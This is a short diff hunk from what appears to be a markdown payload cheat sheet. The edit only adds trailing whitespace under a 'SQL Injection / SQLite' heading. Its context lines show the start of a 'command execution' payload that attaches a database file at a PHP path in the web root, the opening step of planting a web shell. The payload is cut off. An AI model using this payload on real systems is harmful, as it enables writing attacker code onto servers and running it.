@@ -138,7 +138,7 @@ x=1<@/length_2><@/set_var_1>
 ### SQL Injection
 #### SQLite  
 Connect:  
-`$ sqlite3 test.db`
+`$ sqlite3 test.db`  
 Command execution:  
 ```sql
 ATTACH DATABASE '/var/www/html/y.php' AS y;--
